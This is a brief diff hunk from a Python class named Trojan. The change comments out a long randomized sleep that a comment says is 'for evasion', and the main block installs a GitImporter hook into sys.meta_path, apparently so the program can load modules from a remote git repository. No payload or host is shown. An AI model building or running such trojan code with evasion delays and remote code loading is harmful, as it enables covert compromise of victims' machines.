@@ -74,7 +74,7 @@ class Trojan:
                 thread.start()
                 time.sleep(random.randint(1, 10))
 
-            time.sleep(random.randint(100, 1000)) # sleeps are for evasion
+            #time.sleep(random.randint(100, 1000)) # sleeps are for evasion
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
